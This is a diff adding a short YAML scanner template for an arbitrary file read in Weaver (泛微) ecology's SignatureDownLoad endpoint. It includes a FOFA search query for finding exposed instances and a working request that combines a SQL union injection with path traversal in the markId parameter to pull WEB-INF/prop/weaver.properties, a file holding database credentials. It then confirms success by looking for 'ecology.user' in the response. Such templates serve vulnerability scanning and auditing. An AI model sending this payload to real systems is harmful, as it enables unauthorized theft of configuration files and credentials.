@@ -1,0 +1,27 @@
+info:
+  vulId: weaver_ecology_fileread
+  detail: 泛微ecology SignatureDownLoad任意文件读取
+  fofaQuery: app="泛微-E-Weaver"
+rules:
+  - request:
+      payload:
+        - ""
+      path: "{{rootUrl}}/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+      dataType: text
+      data: ""
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - ecology.user
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
